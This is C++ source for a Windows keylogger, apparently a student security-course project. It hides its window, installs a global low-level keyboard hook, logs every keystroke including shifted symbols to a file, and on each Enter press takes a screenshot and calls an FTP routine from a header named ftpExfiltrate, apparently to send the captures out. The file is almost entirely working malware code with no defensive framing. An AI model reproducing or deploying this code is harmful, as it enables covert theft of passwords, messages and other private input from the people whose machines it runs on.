// Keylogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#ifndef UNICODE
#define UNICODE
#endif 

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <new.h>
#include <WindowsX.h>
#include <wchar.h>
#include "basewin.h"
#include "helper.h"
#include "ImageCapture.h"
#include "ftpExfiltrate.h"
#include "SetInterval.h"

using namespace std;
// Command below to monitor changes in textfile.
// Get-content C:\Users\Matthew\Desktop\COMP6841\Project\keylog\keylog\file.txt -Tail 0 -Wait
int num = 0;

class MainWindow : public BaseWindow<MainWindow> {
public:
	PCWSTR  ClassName() const { return L"Invisible Windows"; }
	LRESULT HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam);
};

LRESULT MainWindow::HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam) {
	wchar_t msg[32];
	switch (uMsg)
	{
	case WM_SYSKEYDOWN:
		swprintf_s(msg, L"WM_SYSKEYDOWN: 0x%x\n", wParam);
		OutputDebugString(msg);
		break;

	case WM_SYSCHAR:
		swprintf_s(msg, L"WM_SYSCHAR: %c\n", (wchar_t)wParam);
		OutputDebugString(msg);
		break;
	case WM_SYSKEYUP:
		swprintf_s(msg, L"WM_SYSKEYUP: 0x%x\n", wParam);
		OutputDebugString(msg);
		break;

	case WM_KEYDOWN:
		swprintf_s(msg, L"WM_KEYDOWN: 0x%x\n", wParam);
		OutputDebugString(msg);
		break;

	case WM_KEYUP:
		swprintf_s(msg, L"WM_KEYUP: 0x%x\n", wParam);
		OutputDebugString(msg);
		break;

	case WM_CHAR:
		swprintf_s(msg, L"WM_CHAR: %c\n", (wchar_t)wParam);
		OutputDebugString(msg);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	default:
		return DefWindowProc(m_hwnd, uMsg, wParam, lParam);
	}
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	// A code the hook procedure uses to determine how to process the message.
	char str[2];
	if (nCode == HC_ACTION) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
			DWORD vkCode = kbd->vkCode;
            if (vkCode >= 0x30 && vkCode <= 0x39) {
                // shift key
                if (GetAsyncKeyState(VK_SHIFT)) {
                    switch (vkCode) {
                    case 0x30:
                        Log(")");
                        break;
                    case 0x31:
                        Log("!");
                        break;
                    case 0x32:
                        Log("@");
                        break;
                    case 0x33:
                        Log("#");
                        break;
                    case 0x34:
                        Log("$");
                        break;
                    case 0x35:
                        Log("%");
                        break;
                    case 0x36:
                        Log("^");
                        break;
                    case 0x37:
                        Log("&");
                        break;
                    case 0x38:
                        Log("*");
                        break;
                    case 0x39:
                        Log("(");
                        break;
                    }
                    // no shift key
                } else {
                    sprintf_s(str, "%c", vkCode);
                    Log(str);
                }
                // key is a - z
            } else if (vkCode >= 0x41 && vkCode <= 0x5A) {
                // if lowercase
                if (GetAsyncKeyState(VK_SHIFT) ^ ((GetKeyState(VK_CAPITAL) & 0x0001)) == FALSE)
                    vkCode += 32;
                sprintf_s(str, "%c", vkCode);
                Log(str);
                // all other keys
            } else {
                switch (vkCode) {
                    case VK_CANCEL:
                        Log("[CANCEL]");
                        break;
                    case VK_BACK:
                        Log("[BACKSPACE]");
                        break;
                    case VK_TAB:
                        Log("[TAB]");
                        break;
                    case VK_CLEAR:
                        Log("[CLEAR]");
                        break;
                    case VK_RETURN:
                        SaveAsPng(num);
                        ChilkatFtp(num);
                        num++;
                        Log("[ENTER]");
                        break;
                    case VK_CONTROL:
                        Log("[CTRL]");
                        break;
                    case VK_MENU:
                        Log("[ALT]");
                        break;
                    case VK_PAUSE:
                        Log("[PAUSE]");
                        break;
                    case VK_CAPITAL:
                        Log("[CAPS LOCK]");
                        break;
                    case VK_ESCAPE:
                        Log("[ESC]");
                        break;
                    case VK_SPACE:     
                        Log("[SPACE]");
                        break;
                    case VK_PRIOR:
                        Log("[PAGE UP]");
                        break;
                    case VK_NEXT:
                        Log("[PAGE DOWN]");
                        break;
                    case VK_END:
                        Log("[END]");
                        break;
                    case VK_HOME:
                        Log("[HOME]");
                        break;
                    case VK_LEFT:
                        Log("[LEFT ARROW]");
                        break;
                    case VK_UP:
                        Log("[UP ARROW]");
                        break;
                    case VK_RIGHT:
                        Log("[RIGHT ARROW]");
                        break;
                    case VK_DOWN:
                        Log("[DOWN ARROW]");
                        break;
                    case VK_INSERT:
                        Log("[INS]");
                        break;
                    case VK_DELETE:
                        Log("[DEL]");
                        break;
                    case VK_NUMPAD0:
                        Log("[NUMPAD 0]");
                        break;
                    case VK_NUMPAD1:
                        Log("[NUMPAD 1]");
                        break;
                    case VK_NUMPAD2:
                        Log("[NUMPAD 2]");
                        break;
                    case VK_NUMPAD3:
                        Log("[NUMPAD 3");
                        break;
                    case VK_NUMPAD4:
                        Log("[NUMPAD 4]");
                        break;
                    case VK_NUMPAD5:
                        Log("[NUMPAD 5]");
                        break;
                    case VK_NUMPAD6:
                        Log("[NUMPAD 6]");
                        break;
                    case VK_NUMPAD7:
                        Log("[NUMPAD 7]");
                        break;
                    case VK_NUMPAD8:
                        Log("[NUMPAD 8]");
                        break;
                    case VK_NUMPAD9:
                        Log("[NUMPAD 9]");
                        break;
                    case VK_MULTIPLY:
                        Log("[*]");
                        break;
                    case VK_ADD:
                        Log("[+]");
                        break;
                    case VK_SUBTRACT:
                        Log("[-]");
                        break;
                    case VK_DECIMAL:
                        Log("[.]");
                        break;
                    case VK_DIVIDE:
                        Log("[/]");
                        break;
                    case VK_F1:
                        Log("[F1]");
                        break;
                    case VK_F2:
                        Log("[F2]");
                        break;
                    case VK_F3:
                        Log("[F3]");
                        break;
                    case VK_F4:
                        Log("[F4]");
                        break;
                    case VK_F5:
                        Log("[F5]");
                        break;
                    case VK_F6:
                        Log("[F6]");
                        break;
                    case VK_F7:
                        Log("[F7]");
                        break;
                    case VK_F8:
                        Log("[F8]");
                        break;
                    case VK_F9:
                        Log("[F9]");
                        break;
                    case VK_F10:
                        Log("[F10]");
                        break;
                    case VK_F11:
                        Log("[F11]");
                        break;
                    case VK_F12:
                        Log("[F12]");
                        break;
                    case VK_NUMLOCK:
                        Log("[NUM LOCK]");
                        break;
                    case VK_SCROLL:
                        Log("[SCROLL LOCK]");
                        break;
                    case VK_OEM_PLUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log("+") : Log("=");
                        break;
                    case VK_OEM_COMMA:
                        GetAsyncKeyState(VK_SHIFT) ? Log("<") : Log(",");
                        break;
                    case VK_OEM_MINUS:
                        GetAsyncKeyState(VK_SHIFT) ? Log("_") : Log("-");
                        break;
                    case VK_OEM_PERIOD:
                        GetAsyncKeyState(VK_SHIFT) ? Log(">") : Log(".");
                        break;
                    case VK_OEM_1:
                        GetAsyncKeyState(VK_SHIFT) ? Log(":") : Log(";");
                        break;
                    case VK_OEM_2:
                        GetAsyncKeyState(VK_SHIFT) ? Log("?") : Log("/");
                        break;
                    case VK_OEM_3:
                        GetAsyncKeyState(VK_SHIFT) ? Log("~") : Log("`");
                        break;
                    case VK_OEM_4:
                        GetAsyncKeyState(VK_SHIFT) ? Log("{") : Log("[");
                        break;
                    case VK_OEM_5:
                        GetAsyncKeyState(VK_SHIFT) ? Log("|") : Log("\\");
                        break;
                    case VK_OEM_6:
                        GetAsyncKeyState(VK_SHIFT) ? Log("}") : Log("]");
                        break;
                    case VK_OEM_7:
                        GetAsyncKeyState(VK_SHIFT) ? Log("\"") : Log("'");
                        break;
                }
            }
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	MainWindow win;
	if (!win.Create(L"Keylogger", WS_OVERLAPPEDWINDOW)) {
		return 0;
	}
	ShowWindow(win.Window(), SW_HIDE);
	SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, NULL, 0);

	
	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	} 



	return 0;
}